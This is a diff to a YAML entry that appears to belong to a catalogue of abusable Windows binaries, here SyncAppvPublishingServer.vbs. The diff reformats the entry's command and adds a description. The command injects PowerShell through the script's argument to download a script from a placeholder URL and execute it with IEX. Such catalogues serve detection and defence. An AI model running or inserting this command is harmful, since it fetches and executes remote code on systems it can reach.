@@ -5,9 +5,8 @@ Author: ''
 Created: '2018-05-25'
 Categories: []
 Commands:
-  - Command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1')
-      | IEX"
-    Description: ''
+  - Command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
+    Description: Inject PowerShell script code with the provided arguments
 Full Path:
   - C:\Windows\System32\SyncAppvPublishingServer.vbs
 Code Sample: []
